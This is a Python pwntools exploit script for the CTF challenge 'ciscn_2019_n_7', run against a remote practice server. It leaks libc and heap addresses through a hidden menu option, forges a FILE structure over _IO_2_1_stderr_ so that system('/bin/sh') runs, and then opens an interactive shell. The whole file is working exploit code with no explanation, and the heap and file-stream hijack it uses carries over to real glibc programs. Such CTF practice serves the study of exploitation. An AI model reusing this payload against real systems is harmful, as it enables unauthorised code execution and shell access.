from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ciscn_2019_n_7')
io = remote('node4.buuoj.cn', 29727)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('ciscn_2019_n_7')


def add(size, name):
    io.sendlineafter('Your choice-> \n', '1')
    io.sendlineafter('Input string Length: \n', str(size))
    io.sendafter('Author name:\n', name)


def edit(name, content):
    io.sendlineafter('Your choice-> \n', '2')
    io.sendafter('New Author name:\n', name)
    io.sendafter('New contents:\n', content)


def show():
    io.sendlineafter('Your choice-> \n', '3')


def leak():
    global heap_base, libc_base
    io.sendlineafter('Your choice-> \n', '666')
    libc_base = int(io.recvline()[:-1], 16) - libc.sym['puts']
    add(0xe0, b'a' * 8)
    show()
    io.recvuntil('\nAuthor:' + 'a' * 8)
    heap_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) - 0x30
    log.success('libc_base: ' + hex(libc_base))
    log.success('heap_base: ' + hex(heap_base))


def pwn():
    _IO_2_1_stderr_ = libc_base + libc.sym['_IO_2_1_stderr_']
    system = libc_base + libc.sym['system']
    payload = b'/bin/sh\x00' + p64(0) * 3
    payload += p64(0) + p64(1) + p64(system)
    payload = payload.ljust(0xd8, b'\x00')
    payload += p64(_IO_2_1_stderr_ + 0x18)
    edit(b'a' * 8 + p64(_IO_2_1_stderr_), payload)
    # gdb.attach(io)
    # pause()
    io.sendlineafter('Your choice-> \n', '4')
    io.sendline('exec 1>&0')
    io.interactive()


if __name__ == '__main__':
    leak()
    pwn()
